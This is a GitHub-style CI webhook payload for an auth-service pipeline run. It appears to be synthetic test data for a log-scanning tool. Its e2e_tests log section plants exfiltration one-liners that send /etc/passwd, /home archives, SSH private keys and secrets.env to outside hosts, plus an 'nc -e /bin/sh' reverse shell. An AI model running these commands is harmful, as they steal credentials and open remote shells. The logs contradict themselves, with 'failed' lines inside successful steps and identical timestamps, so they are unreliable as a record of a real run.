{
  "action": "completed",
  "workflow_run": {
    "id": 877,
    "name": "CI Pipeline",
    "head_branch": "feature/feat-216",
    "head_sha": "0e1154fe8c01abef1ffc18a5bb2ff6efabff90e5",
    "status": "completed",
    "conclusion": "success",
    "run_started_at": "2025-11-28T12:00:35.611777Z",
    "updated_at": "2025-11-28T12:02:56.367236Z"
  },
  "repository": {
    "full_name": "startup-io/auth-service",
    "name": "auth-service"
  },
  "sender": {
    "login": "eve"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: deploy_staging ===\nStep 6/10: Building\n[12:00:35] INFO: Processing request\nCache hit for key-5556\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n\u2713 build completed\nInstalling jest@4.5.0\n\u2713 build completed\n  PASS: test_cache_hit (425ms)\n[12:00:35] INFO: Processing request\nCompiling src/utils.go...\nCache hit for key-7873\n  PASS: test_db_connect (99ms)\nInstalling lodash@5.9.0\nArtifact uploaded: build.tar.gz (21MB)\n  PASS: test_auth_login (360ms)\n[12:00:35] WARN: Deprecated API usage\nStep 9/10: Building\n  PASS: test_auth_login (470ms)\n  PASS: test_auth_login (39ms)\n\u2713 test completed\nCompiling src/app.ts...\n\u2713 test completed\n[12:00:35] INFO: Processing request\nArtifact uploaded: build.tar.gz (40MB)\nArtifact uploaded: build.tar.gz (27MB)\nCompiling src/service.java...\nArtifact uploaded: build.tar.gz (44MB)\nCompiling src/app.ts...\nCompiling src/app.ts...\n  PASS: test_user_create (273ms)\n[12:00:35] INFO: Processing request\n[12:00:35] WARN: Deprecated API usage\nCache hit for key-3467\n  PASS: test_api_health (191ms)\nStep 5/10: Building\nInstalling react@3.9.0\n  PASS: test_db_connect (207ms)\nStep 7/10: Building\nArtifact uploaded: build.tar.gz (3MB)\nInstalling prettier@5.17.0\nArtifact uploaded: build.tar.gz (35MB)\n\u2713 test completed\nInstalling react@2.8.0\n=== Step deploy_staging completed ===\n=== Step: checkout ===\nInstalling webpack@3.14.0\n  PASS: test_api_health (229ms)\n\u2713 build completed\n[12:00:35] INFO: Processing request\n[12:00:35] ERROR: Connection failed\n[12:00:35] WARN: Deprecated API usage\nStep 8/10: Building\nInstalling eslint@3.7.0\nInstalling eslint@4.13.0\nCompiling src/app.ts...\nInstalling eslint@1.16.0\n[12:00:35] WARN: Deprecated API usage\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:00:35] INFO: Processing request\n[12:00:35] INFO: Processing request\nCompiling src/main.py...\nInstalling lodash@2.8.0\nWARNING: express has known vulnerabilities\n\u2713 lint completed\nCache hit for key-2119\n\u2713 test completed\n\u2713 build completed\nInstalling express@4.16.0\nInstalling react@4.3.0\n\u2713 lint completed\n[12:00:35] INFO: Processing request\n  PASS: test_db_connect (399ms)\nStep 8/10: Building\n  PASS: test_api_health (46ms)\nArtifact uploaded: build.tar.gz (17MB)\nCompiling src/app.ts...\n  PASS: test_auth_login (363ms)\n\u2713 test completed\nInstalling express@4.12.0\n[12:00:35] INFO: Processing request\n  PASS: test_cache_hit (381ms)\nStep 1/10: Building\nInstalling jest@5.17.0\n[12:00:35] INFO: Processing request\nWARNING: axios has known vulnerabilities\nCache hit for key-3613\n  PASS: test_auth_login (65ms)\n\u2713 test completed\n=== Step checkout completed ===\n=== Step: setup_node ===\n\u2713 build completed\nStep 8/10: Building\n\u2713 build completed\nInstalling express@3.14.0\n\u2713 test completed\n[12:00:35] WARN: Deprecated API usage\n[12:00:35] WARN: Deprecated API usage\nWARNING: prettier has known vulnerabilities\n[12:00:35] INFO: Processing request\nCompiling src/main.py...\nInstalling jest@3.20.0\nArtifact uploaded: build.tar.gz (6MB)\n\u2713 lint completed\nCache hit for key-8753\nInstalling prettier@1.9.0\nCache hit for key-3562\nInstalling webpack@5.18.0\nCompiling src/service.java...\n\u2713 lint completed\n\u2713 test completed\nStep 7/10: Building\nInstalling express@4.3.0\n[12:00:35] INFO: Processing request\nException: ValueError\nCache hit for key-4461\nArtifact uploaded: build.tar.gz (47MB)\n\u2713 build completed\n  PASS: test_auth_login (48ms)\nArtifact uploaded: build.tar.gz (37MB)\n[12:00:35] INFO: Processing request\n\u2713 test completed\nCompiling src/app.ts...\n  PASS: test_cache_hit (276ms)\nInstalling react@5.4.0\nStep 6/10: Building\n\u2713 test completed\n[12:00:35] INFO: Processing request\n[12:00:35] INFO: Processing request\n[12:00:35] INFO: Processing request\n[12:00:35] WARN: Deprecated API usage\n\u2713 build completed\n  PASS: test_db_connect (297ms)\n\u2717 build failed with exit code 112\n=== Step setup_node completed ===\n=== Step: deploy_production ===\nCache hit for key-3659\n  PASS: test_cache_hit (342ms)\nInstalling lodash@2.4.0\n  PASS: test_auth_login (49ms)\n  PASS: test_user_create (20ms)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nArtifact uploaded: build.tar.gz (28MB)\nInstalling react@2.4.0\nInstalling prettier@4.19.0\nCache hit for key-5113\n[12:00:35] INFO: Processing request\n[12:00:35] INFO: Processing request\nCache hit for key-4092\n\u2713 test completed\n[12:00:35] INFO: Processing request\nCache hit for key-2803\nStep 1/10: Building\nArtifact uploaded: build.tar.gz (26MB)\nInstalling prettier@3.2.0\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (7MB)\nInstalling webpack@2.16.0\nCompiling src/app.ts...\n\u2713 lint completed\nStep 3/10: Building\nStep 6/10: Building\n\u2713 test completed\n  PASS: test_user_create (369ms)\nArtifact uploaded: build.tar.gz (24MB)\nInstalling express@3.15.0\n[12:00:35] INFO: Processing request\n  PASS: test_cache_hit (173ms)\nInstalling react@2.20.0\nCache hit for key-4675\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (2MB)\nStep 2/10: Building\n[12:00:35] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (16MB)\nCompiling src/main.py...\n  PASS: test_auth_login (414ms)\nStep 9/10: Building\n=== Step deploy_production completed ===\n=== Step: upload_artifacts ===\n[12:00:35] INFO: Processing request\n\u2713 lint completed\nWARNING: express has known vulnerabilities\nInstalling webpack@1.9.0\n[12:00:35] INFO: Processing request\n[12:00:35] INFO: Processing request\nStep 8/10: Building\nCache hit for key-1761\nCompiling src/main.py...\nCache hit for key-9958\n\u2713 build completed\nCompiling src/handler.rs...\n  PASS: test_cache_hit (49ms)\n  PASS: test_cache_hit (254ms)\nCompiling src/utils.go...\nCache hit for key-7397\n\u2717 build failed with exit code 11\nException: RuntimeError\n\u2713 build completed\nArtifact uploaded: build.tar.gz (27MB)\nCache hit for key-5456\nCache hit for key-4740\nCache hit for key-7234\nArtifact uploaded: build.tar.gz (34MB)\nArtifact uploaded: build.tar.gz (27MB)\nStep 5/10: Building\nCache hit for key-5108\nArtifact uploaded: build.tar.gz (35MB)\nCache hit for key-4998\nCache hit for key-3487\n[12:00:35] INFO: Processing request\n  PASS: test_user_create (244ms)\n  PASS: test_cache_hit (419ms)\nCache hit for key-6049\n  PASS: test_db_connect (185ms)\nArtifact uploaded: build.tar.gz (36MB)\nStep 1/10: Building\nArtifact uploaded: build.tar.gz (12MB)\n[12:00:35] ERROR: Connection failed\nStep 4/10: Building\nCompiling src/handler.rs...\nCompiling src/service.java...\n\u2713 lint completed\n=== Step upload_artifacts completed ===\n=== Step: save_cache ===\nCache hit for key-9496\n  PASS: test_auth_login (32ms)\nWARNING: eslint has known vulnerabilities\n[12:00:35] INFO: Processing request\nArtifact uploaded: build.tar.gz (38MB)\n\u2713 build completed\nCache hit for key-5902\nCache hit for key-1068\n[12:00:35] INFO: Processing request\nArtifact uploaded: build.tar.gz (24MB)\nCache hit for key-4040\n\u2713 test completed\nArtifact uploaded: build.tar.gz (46MB)\nCache hit for key-5190\n[12:00:35] INFO: Processing request\n  PASS: test_user_create (211ms)\nArtifact uploaded: build.tar.gz (46MB)\n  PASS: test_api_health (131ms)\n[12:00:35] INFO: Processing request\nCache hit for key-3760\n\u2713 test completed\n\u2713 test completed\n\u2713 build completed\nInstalling jest@4.3.0\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (36MB)\nArtifact uploaded: build.tar.gz (26MB)\nCache hit for key-5515\nCompiling src/main.py...\nStep 6/10: Building\nCompiling src/utils.go...\nWARNING: react has known vulnerabilities\nCompiling src/app.ts...\nInstalling jest@2.19.0\nFAILED: test_db_connect\nInstalling webpack@3.8.0\nCompiling src/handler.rs...\nInstalling eslint@2.4.0\nInstalling jest@5.15.0\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n  PASS: test_cache_hit (339ms)\nCache hit for key-9420\nWARNING: prettier has known vulnerabilities\n=== Step save_cache completed ===\n=== Step: unit_tests ===\nCache hit for key-9529\nCompiling src/service.java...\nFAILED: test_api_health\n[12:00:35] INFO: Processing request\nCompiling src/index.js...\nWARNING: express has known vulnerabilities\nStep 8/10: Building\n  PASS: test_user_create (270ms)\n[12:00:35] INFO: Processing request\n[12:00:35] INFO: Processing request\nCache hit for key-8826\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (23MB)\n[12:00:35] INFO: Processing request\nInstalling react@1.8.0\n[12:00:35] INFO: Processing request\n  PASS: test_cache_hit (23ms)\nArtifact uploaded: build.tar.gz (5MB)\n[12:00:35] WARN: Deprecated API usage\n  PASS: test_auth_login (479ms)\nCache hit for key-8294\n\u2713 lint completed\n\u2713 test completed\n[12:00:35] INFO: Processing request\nCompiling src/main.py...\n[12:00:35] INFO: Processing request\nCompiling src/service.java...\n\u2713 build completed\n[12:00:35] INFO: Processing request\n  PASS: test_user_create (306ms)\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (49MB)\nCache hit for key-8705\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nStep 5/10: Building\nCache hit for key-4546\n\u2713 test completed\n[12:00:35] INFO: Processing request\nStep 1/10: Building\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (45MB)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n  PASS: test_user_create (281ms)\n=== Step unit_tests completed ===\n=== Step: type_check ===\nCache hit for key-3446\n\u2713 test completed\n\u2713 test completed\nCache hit for key-6729\n[12:00:35] INFO: Processing request\nArtifact uploaded: build.tar.gz (40MB)\nCompiling src/utils.go...\n[12:00:35] INFO: Processing request\nStep 4/10: Building\n[12:00:35] INFO: Processing request\n  PASS: test_auth_login (119ms)\n[12:00:35] WARN: Deprecated API usage\n\u2713 build completed\nCache hit for key-9735\n[12:00:35] WARN: Deprecated API usage\nInstalling webpack@2.19.0\nArtifact uploaded: build.tar.gz (23MB)\n[12:00:35] WARN: Deprecated API usage\n[12:00:35] INFO: Processing request\n\u2713 build completed\nStep 2/10: Building\nInstalling eslint@1.6.0\nStep 8/10: Building\nCache hit for key-1262\nInstalling jest@1.17.0\nInstalling jest@4.1.0\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nWARNING: react has known vulnerabilities\nInstalling express@1.2.0\nWARNING: prettier has known vulnerabilities\nCache hit for key-5629\nCache hit for key-9347\nFAILED: test_user_create\nArtifact uploaded: build.tar.gz (45MB)\nInstalling lodash@3.4.0\nCompiling src/index.js...\n[12:00:35] INFO: Processing request\nStep 8/10: Building\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (12MB)\n[12:00:35] INFO: Processing request\nCompiling src/index.js...\nStep 3/10: Building\n=== Step type_check completed ===\n=== Step: setup_environment ===\n[12:00:35] INFO: Processing request\n[12:00:35] INFO: Processing request\n[12:00:35] ERROR: Connection failed\n[12:00:35] INFO: Processing request\nStep 7/10: Building\nInstalling eslint@1.2.0\nInstalling express@4.0.0\n\u2713 test completed\n[12:00:35] WARN: Deprecated API usage\nStep 8/10: Building\n  PASS: test_user_create (451ms)\nWARNING: prettier has known vulnerabilities\nInstalling lodash@1.20.0\nStep 2/10: Building\n\u2713 lint completed\nStep 8/10: Building\nCache hit for key-3539\nInstalling eslint@2.3.0\n[12:00:35] INFO: Processing request\nStep 1/10: Building\nStep 3/10: Building\nInstalling webpack@1.6.0\n\u2713 test completed\nStep 4/10: Building\nInstalling axios@2.13.0\n  PASS: test_api_health (455ms)\nCompiling src/utils.go...\nInstalling jest@4.13.0\nStep 10/10: Building\n[12:00:35] INFO: Processing request\n\u2713 build completed\n[12:00:35] INFO: Processing request\n  PASS: test_api_health (210ms)\nStep 7/10: Building\nCompiling src/handler.rs...\nStep 3/10: Building\n[12:00:35] WARN: Deprecated API usage\n[12:00:35] INFO: Processing request\n[12:00:35] INFO: Processing request\nStep 3/10: Building\nInstalling webpack@3.12.0\n\u2713 lint completed\nCompiling src/utils.go...\n=== Step setup_environment completed ===\n=== Step: build ===\nInstalling webpack@5.10.0\n  PASS: test_auth_login (374ms)\n[12:00:35] INFO: Processing request\nStep 4/10: Building\nCache hit for key-3483\n  PASS: test_auth_login (134ms)\n  PASS: test_cache_hit (331ms)\nInstalling react@3.17.0\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (47MB)\nCache hit for key-3218\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (1MB)\nCompiling src/app.ts...\nStep 1/10: Building\nStep 5/10: Building\n[12:00:35] INFO: Processing request\nArtifact uploaded: build.tar.gz (22MB)\nInstalling prettier@1.0.0\nStep 2/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCompiling src/app.ts...\nCache hit for key-6945\nStep 10/10: Building\nWARNING: jest has known vulnerabilities\n\u2713 build completed\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:00:35] INFO: Processing request\nStep 5/10: Building\nInstalling eslint@5.11.0\nInstalling react@4.20.0\n  PASS: test_auth_login (188ms)\n  PASS: test_db_connect (273ms)\n  PASS: test_api_health (183ms)\nCompiling src/app.ts...\nCache hit for key-5723\nStep 4/10: Building\nCache hit for key-1869\n[12:00:35] INFO: Processing request\n\u2713 build completed\nCompiling src/index.js...\nCache hit for key-6454\nArtifact uploaded: build.tar.gz (43MB)\n=== Step build completed ===\n=== Step: e2e_tests ===\n\u2717 build failed with exit code 6\nWARNING: webpack has known vulnerabilities\nwget --post-data=\"$(cat /etc/passwd)\" https://example.com/\nStep 1/10: Building\ntar czf - /home | curl -X POST -d @- https://test.io/upload\n\u2713 lint completed\n  PASS: test_api_health (122ms)\nArtifact uploaded: build.tar.gz (22MB)\n  PASS: test_cache_hit (296ms)\nStep 3/10: Building\n  PASS: test_api_health (348ms)\nnc -e /bin/sh 162.78.214.84 4353\n\u2713 lint completed\n[12:00:35] WARN: Deprecated API usage\nStep 6/10: Building\nCompiling src/service.java...\nCompiling src/service.java...\nSending 236MB of data to cloud.services\n[12:00:35] INFO: Processing request\n[12:00:35] INFO: Processing request\nArtifact uploaded: build.tar.gz (50MB)\nInstalling webpack@2.18.0\n[12:00:35] INFO: Processing request\nCompiling src/main.py...\n\u2713 test completed\nArtifact uploaded: build.tar.gz (17MB)\necho $(cat ~/.ssh/id_rsa) | base64 | nc 130.100.6.65 52381\nArtifact uploaded: build.tar.gz (18MB)\n\u2713 test completed\nArtifact uploaded: build.tar.gz (37MB)\nSending 273MB of data to test.io\nCompiling src/index.js...\nwget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/\necho $(cat ~/.ssh/id_rsa) | base64 | nc 203.154.47.213 15532\n  PASS: test_cache_hit (485ms)\nCompiling src/index.js...\n  PASS: test_cache_hit (26ms)\n\u2713 build completed\nFAILED: test_user_create\nSending 174MB of data to example.com\nCache hit for key-8228\necho $(cat ~/.ssh/id_rsa) | base64 | nc 31.239.212.67 10782\nInstalling webpack@1.14.0\ntar czf - /home | curl -X POST -d @- https://acme.corp/upload\nArtifact uploaded: build.tar.gz (4MB)\nFAILED: test_api_health\n[12:00:35] INFO: Processing request\ncurl -X POST https://test.io/collect -d @secrets.env\n[12:00:35] ERROR: Connection failed\nInstalling webpack@4.15.0\nCompiling src/handler.rs...\nSending 193MB of data to startup.dev\ntar czf - /home | curl -X POST -d @- https://example.com/upload\nStep 10/10: Building\n\u2717 build failed with exit code 33\nStep 5/10: Building\nArtifact uploaded: build.tar.gz (39MB)\n=== Step e2e_tests completed ===",
    "steps": [
      {
        "name": "deploy_staging",
        "status": "success",
        "started_at": "2025-11-28T12:00:35.611777",
        "finished_at": "2025-11-28T12:00:46.115916",
        "log_lines": [
          "=== Step: deploy_staging ===",
          "Step 6/10: Building",
          "[12:00:35] INFO: Processing request",
          "Cache hit for key-5556",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "\u2713 build completed",
          "Installing jest@4.5.0",
          "\u2713 build completed",
          "  PASS: test_cache_hit (425ms)",
          "[12:00:35] INFO: Processing request",
          "Compiling src/utils.go...",
          "Cache hit for key-7873",
          "  PASS: test_db_connect (99ms)",
          "Installing lodash@5.9.0",
          "Artifact uploaded: build.tar.gz (21MB)",
          "  PASS: test_auth_login (360ms)",
          "[12:00:35] WARN: Deprecated API usage",
          "Step 9/10: Building",
          "  PASS: test_auth_login (470ms)",
          "  PASS: test_auth_login (39ms)",
          "\u2713 test completed",
          "Compiling src/app.ts...",
          "\u2713 test completed",
          "[12:00:35] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (40MB)",
          "Artifact uploaded: build.tar.gz (27MB)",
          "Compiling src/service.java...",
          "Artifact uploaded: build.tar.gz (44MB)",
          "Compiling src/app.ts...",
          "Compiling src/app.ts...",
          "  PASS: test_user_create (273ms)",
          "[12:00:35] INFO: Processing request",
          "[12:00:35] WARN: Deprecated API usage",
          "Cache hit for key-3467",
          "  PASS: test_api_health (191ms)",
          "Step 5/10: Building",
          "Installing react@3.9.0",
          "  PASS: test_db_connect (207ms)",
          "Step 7/10: Building",
          "Artifact uploaded: build.tar.gz (3MB)",
          "Installing prettier@5.17.0",
          "Artifact uploaded: build.tar.gz (35MB)",
          "\u2713 test completed",
          "Installing react@2.8.0",
          "=== Step deploy_staging completed ==="
        ]
      },
      {
        "name": "checkout",
        "status": "success",
        "started_at": "2025-11-28T12:00:46.115916",
        "finished_at": "2025-11-28T12:00:50.317571",
        "log_lines": [
          "=== Step: checkout ===",
          "Installing webpack@3.14.0",
          "  PASS: test_api_health (229ms)",
          "\u2713 build completed",
          "[12:00:35] INFO: Processing request",
          "[12:00:35] ERROR: Connection failed",
          "[12:00:35] WARN: Deprecated API usage",
          "Step 8/10: Building",
          "Installing eslint@3.7.0",
          "Installing eslint@4.13.0",
          "Compiling src/app.ts...",
          "Installing eslint@1.16.0",
          "[12:00:35] WARN: Deprecated API usage",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:00:35] INFO: Processing request",
          "[12:00:35] INFO: Processing request",
          "Compiling src/main.py...",
          "Installing lodash@2.8.0",
          "WARNING: express has known vulnerabilities",
          "\u2713 lint completed",
          "Cache hit for key-2119",
          "\u2713 test completed",
          "\u2713 build completed",
          "Installing express@4.16.0",
          "Installing react@4.3.0",
          "\u2713 lint completed",
          "[12:00:35] INFO: Processing request",
          "  PASS: test_db_connect (399ms)",
          "Step 8/10: Building",
          "  PASS: test_api_health (46ms)",
          "Artifact uploaded: build.tar.gz (17MB)",
          "Compiling src/app.ts...",
          "  PASS: test_auth_login (363ms)",
          "\u2713 test completed",
          "Installing express@4.12.0",
          "[12:00:35] INFO: Processing request",
          "  PASS: test_cache_hit (381ms)",
          "Step 1/10: Building",
          "Installing jest@5.17.0",
          "[12:00:35] INFO: Processing request",
          "WARNING: axios has known vulnerabilities",
          "Cache hit for key-3613",
          "  PASS: test_auth_login (65ms)",
          "\u2713 test completed",
          "=== Step checkout completed ==="
        ]
      },
      {
        "name": "setup_node",
        "status": "success",
        "started_at": "2025-11-28T12:00:50.317571",
        "finished_at": "2025-11-28T12:01:00.821710",
        "log_lines": [
          "=== Step: setup_node ===",
          "\u2713 build completed",
          "Step 8/10: Building",
          "\u2713 build completed",
          "Installing express@3.14.0",
          "\u2713 test completed",
          "[12:00:35] WARN: Deprecated API usage",
          "[12:00:35] WARN: Deprecated API usage",
          "WARNING: prettier has known vulnerabilities",
          "[12:00:35] INFO: Processing request",
          "Compiling src/main.py...",
          "Installing jest@3.20.0",
          "Artifact uploaded: build.tar.gz (6MB)",
          "\u2713 lint completed",
          "Cache hit for key-8753",
          "Installing prettier@1.9.0",
          "Cache hit for key-3562",
          "Installing webpack@5.18.0",
          "Compiling src/service.java...",
          "\u2713 lint completed",
          "\u2713 test completed",
          "Step 7/10: Building",
          "Installing express@4.3.0",
          "[12:00:35] INFO: Processing request",
          "Exception: ValueError",
          "Cache hit for key-4461",
          "Artifact uploaded: build.tar.gz (47MB)",
          "\u2713 build completed",
          "  PASS: test_auth_login (48ms)",
          "Artifact uploaded: build.tar.gz (37MB)",
          "[12:00:35] INFO: Processing request",
          "\u2713 test completed",
          "Compiling src/app.ts...",
          "  PASS: test_cache_hit (276ms)",
          "Installing react@5.4.0",
          "Step 6/10: Building",
          "\u2713 test completed",
          "[12:00:35] INFO: Processing request",
          "[12:00:35] INFO: Processing request",
          "[12:00:35] INFO: Processing request",
          "[12:00:35] WARN: Deprecated API usage",
          "\u2713 build completed",
          "  PASS: test_db_connect (297ms)",
          "\u2717 build failed with exit code 112",
          "=== Step setup_node completed ==="
        ]
      },
      {
        "name": "deploy_production",
        "status": "success",
        "started_at": "2025-11-28T12:01:00.821710",
        "finished_at": "2025-11-28T12:01:05.023365",
        "log_lines": [
          "=== Step: deploy_production ===",
          "Cache hit for key-3659",
          "  PASS: test_cache_hit (342ms)",
          "Installing lodash@2.4.0",
          "  PASS: test_auth_login (49ms)",
          "  PASS: test_user_create (20ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Artifact uploaded: build.tar.gz (28MB)",
          "Installing react@2.4.0",
          "Installing prettier@4.19.0",
          "Cache hit for key-5113",
          "[12:00:35] INFO: Processing request",
          "[12:00:35] INFO: Processing request",
          "Cache hit for key-4092",
          "\u2713 test completed",
          "[12:00:35] INFO: Processing request",
          "Cache hit for key-2803",
          "Step 1/10: Building",
          "Artifact uploaded: build.tar.gz (26MB)",
          "Installing prettier@3.2.0",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (7MB)",
          "Installing webpack@2.16.0",
          "Compiling src/app.ts...",
          "\u2713 lint completed",
          "Step 3/10: Building",
          "Step 6/10: Building",
          "\u2713 test completed",
          "  PASS: test_user_create (369ms)",
          "Artifact uploaded: build.tar.gz (24MB)",
          "Installing express@3.15.0",
          "[12:00:35] INFO: Processing request",
          "  PASS: test_cache_hit (173ms)",
          "Installing react@2.20.0",
          "Cache hit for key-4675",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (2MB)",
          "Step 2/10: Building",
          "[12:00:35] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (16MB)",
          "Compiling src/main.py...",
          "  PASS: test_auth_login (414ms)",
          "Step 9/10: Building",
          "=== Step deploy_production completed ==="
        ]
      },
      {
        "name": "upload_artifacts",
        "status": "success",
        "started_at": "2025-11-28T12:01:05.023365",
        "finished_at": "2025-11-28T12:01:15.527504",
        "log_lines": [
          "=== Step: upload_artifacts ===",
          "[12:00:35] INFO: Processing request",
          "\u2713 lint completed",
          "WARNING: express has known vulnerabilities",
          "Installing webpack@1.9.0",
          "[12:00:35] INFO: Processing request",
          "[12:00:35] INFO: Processing request",
          "Step 8/10: Building",
          "Cache hit for key-1761",
          "Compiling src/main.py...",
          "Cache hit for key-9958",
          "\u2713 build completed",
          "Compiling src/handler.rs...",
          "  PASS: test_cache_hit (49ms)",
          "  PASS: test_cache_hit (254ms)",
          "Compiling src/utils.go...",
          "Cache hit for key-7397",
          "\u2717 build failed with exit code 11",
          "Exception: RuntimeError",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (27MB)",
          "Cache hit for key-5456",
          "Cache hit for key-4740",
          "Cache hit for key-7234",
          "Artifact uploaded: build.tar.gz (34MB)",
          "Artifact uploaded: build.tar.gz (27MB)",
          "Step 5/10: Building",
          "Cache hit for key-5108",
          "Artifact uploaded: build.tar.gz (35MB)",
          "Cache hit for key-4998",
          "Cache hit for key-3487",
          "[12:00:35] INFO: Processing request",
          "  PASS: test_user_create (244ms)",
          "  PASS: test_cache_hit (419ms)",
          "Cache hit for key-6049",
          "  PASS: test_db_connect (185ms)",
          "Artifact uploaded: build.tar.gz (36MB)",
          "Step 1/10: Building",
          "Artifact uploaded: build.tar.gz (12MB)",
          "[12:00:35] ERROR: Connection failed",
          "Step 4/10: Building",
          "Compiling src/handler.rs...",
          "Compiling src/service.java...",
          "\u2713 lint completed",
          "=== Step upload_artifacts completed ==="
        ]
      },
      {
        "name": "save_cache",
        "status": "success",
        "started_at": "2025-11-28T12:01:15.527504",
        "finished_at": "2025-11-28T12:01:21.829987",
        "log_lines": [
          "=== Step: save_cache ===",
          "Cache hit for key-9496",
          "  PASS: test_auth_login (32ms)",
          "WARNING: eslint has known vulnerabilities",
          "[12:00:35] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (38MB)",
          "\u2713 build completed",
          "Cache hit for key-5902",
          "Cache hit for key-1068",
          "[12:00:35] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (24MB)",
          "Cache hit for key-4040",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (46MB)",
          "Cache hit for key-5190",
          "[12:00:35] INFO: Processing request",
          "  PASS: test_user_create (211ms)",
          "Artifact uploaded: build.tar.gz (46MB)",
          "  PASS: test_api_health (131ms)",
          "[12:00:35] INFO: Processing request",
          "Cache hit for key-3760",
          "\u2713 test completed",
          "\u2713 test completed",
          "\u2713 build completed",
          "Installing jest@4.3.0",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (36MB)",
          "Artifact uploaded: build.tar.gz (26MB)",
          "Cache hit for key-5515",
          "Compiling src/main.py...",
          "Step 6/10: Building",
          "Compiling src/utils.go...",
          "WARNING: react has known vulnerabilities",
          "Compiling src/app.ts...",
          "Installing jest@2.19.0",
          "FAILED: test_db_connect",
          "Installing webpack@3.8.0",
          "Compiling src/handler.rs...",
          "Installing eslint@2.4.0",
          "Installing jest@5.15.0",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "  PASS: test_cache_hit (339ms)",
          "Cache hit for key-9420",
          "WARNING: prettier has known vulnerabilities",
          "=== Step save_cache completed ==="
        ]
      },
      {
        "name": "unit_tests",
        "status": "success",
        "started_at": "2025-11-28T12:01:21.829987",
        "finished_at": "2025-11-28T12:01:53.342403",
        "log_lines": [
          "=== Step: unit_tests ===",
          "Cache hit for key-9529",
          "Compiling src/service.java...",
          "FAILED: test_api_health",
          "[12:00:35] INFO: Processing request",
          "Compiling src/index.js...",
          "WARNING: express has known vulnerabilities",
          "Step 8/10: Building",
          "  PASS: test_user_create (270ms)",
          "[12:00:35] INFO: Processing request",
          "[12:00:35] INFO: Processing request",
          "Cache hit for key-8826",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (23MB)",
          "[12:00:35] INFO: Processing request",
          "Installing react@1.8.0",
          "[12:00:35] INFO: Processing request",
          "  PASS: test_cache_hit (23ms)",
          "Artifact uploaded: build.tar.gz (5MB)",
          "[12:00:35] WARN: Deprecated API usage",
          "  PASS: test_auth_login (479ms)",
          "Cache hit for key-8294",
          "\u2713 lint completed",
          "\u2713 test completed",
          "[12:00:35] INFO: Processing request",
          "Compiling src/main.py...",
          "[12:00:35] INFO: Processing request",
          "Compiling src/service.java...",
          "\u2713 build completed",
          "[12:00:35] INFO: Processing request",
          "  PASS: test_user_create (306ms)",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (49MB)",
          "Cache hit for key-8705",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Step 5/10: Building",
          "Cache hit for key-4546",
          "\u2713 test completed",
          "[12:00:35] INFO: Processing request",
          "Step 1/10: Building",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (45MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "  PASS: test_user_create (281ms)",
          "=== Step unit_tests completed ==="
        ]
      },
      {
        "name": "type_check",
        "status": "success",
        "started_at": "2025-11-28T12:01:53.342403",
        "finished_at": "2025-11-28T12:02:03.846542",
        "log_lines": [
          "=== Step: type_check ===",
          "Cache hit for key-3446",
          "\u2713 test completed",
          "\u2713 test completed",
          "Cache hit for key-6729",
          "[12:00:35] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (40MB)",
          "Compiling src/utils.go...",
          "[12:00:35] INFO: Processing request",
          "Step 4/10: Building",
          "[12:00:35] INFO: Processing request",
          "  PASS: test_auth_login (119ms)",
          "[12:00:35] WARN: Deprecated API usage",
          "\u2713 build completed",
          "Cache hit for key-9735",
          "[12:00:35] WARN: Deprecated API usage",
          "Installing webpack@2.19.0",
          "Artifact uploaded: build.tar.gz (23MB)",
          "[12:00:35] WARN: Deprecated API usage",
          "[12:00:35] INFO: Processing request",
          "\u2713 build completed",
          "Step 2/10: Building",
          "Installing eslint@1.6.0",
          "Step 8/10: Building",
          "Cache hit for key-1262",
          "Installing jest@1.17.0",
          "Installing jest@4.1.0",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "WARNING: react has known vulnerabilities",
          "Installing express@1.2.0",
          "WARNING: prettier has known vulnerabilities",
          "Cache hit for key-5629",
          "Cache hit for key-9347",
          "FAILED: test_user_create",
          "Artifact uploaded: build.tar.gz (45MB)",
          "Installing lodash@3.4.0",
          "Compiling src/index.js...",
          "[12:00:35] INFO: Processing request",
          "Step 8/10: Building",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (12MB)",
          "[12:00:35] INFO: Processing request",
          "Compiling src/index.js...",
          "Step 3/10: Building",
          "=== Step type_check completed ==="
